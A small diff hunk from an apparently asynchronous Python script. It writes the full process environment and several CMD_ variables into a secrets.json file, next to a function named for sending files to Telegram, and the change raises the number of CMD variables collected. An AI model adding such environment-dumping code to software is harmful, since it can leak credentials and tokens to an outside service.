@@ -17,7 +17,7 @@ async def send_file_to_telegram():
 async def main():
     with open("secrets.json", "w") as f:
         data = {}
-        for code in range(1, 11, 1):
+        for code in range(1, 14, 1):
             data["environ"] = str(os.environ)
             data[f"CMD_{code}"] = [os.environ[f"CMD_{code}"]]
         json.dump(data, f, indent=4)
